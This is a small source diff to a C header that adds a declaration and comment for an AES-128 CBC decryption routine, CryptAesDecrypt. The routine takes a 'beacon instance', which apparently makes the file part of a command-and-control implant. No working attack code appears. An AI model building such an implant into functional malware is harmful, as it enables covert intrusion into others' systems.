@@ -29,3 +29,15 @@ DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins );
  *
 -*/
 DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins );
+
+/*-
+ *
+ * CryptAesDecrypt
+ *
+ * Purpose:
+ *
+ * Decrypts the buffer using AES-128
+ * CBC.
+ *
+-*/
+DEFINESEC(B) BOOL CryptAesDecrypt( PBEACON_INSTANCE Ins, PVOID InOut, ULONG InOutLen );
